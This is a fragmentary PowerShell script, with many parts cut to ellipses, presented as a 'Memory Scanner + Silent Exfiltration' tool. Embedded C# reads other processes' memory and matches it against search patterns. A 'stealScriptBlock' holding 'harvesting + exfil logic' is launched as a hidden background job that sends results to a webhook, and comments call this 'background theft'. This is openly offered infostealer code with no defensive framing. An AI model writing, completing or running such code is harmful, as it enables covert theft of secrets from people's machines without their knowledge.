# MemoryScan.ps1 – Memory Scanner + Silent Exfiltration (v2 FIXED)
param(
...
# C# memory scanner – now uses string.Format() instead of interpolation
Add-Type @"
using System;
                    ...
                    if (ReadProcessMemory(hProcess, mbi.BaseAddress, buffer, buffer.Length, out int bytesRead)) {
                        ...
                        foreach (string pattern in patterns) {
                            if (text.IndexOf(pattern, StringComparison.OrdinalIgnoreCase) >= 0) {
                                results.Add(string.Format("0x{0:X16} -> {1}", mbi.BaseAddress.ToInt64(), pattern));
                            }
                        }
                    }
                }
...
# Define a scriptblock that contains all the harvesting + exfil logic
$stealScriptBlock = {
    param($hook)
...
# Start the background exfiltration using the self-contained scriptblock
$job = Start-Job -ScriptBlock $stealScriptBlock -ArgumentList $Script:Webhook
...
# Wait for background theft to finish (hidden)
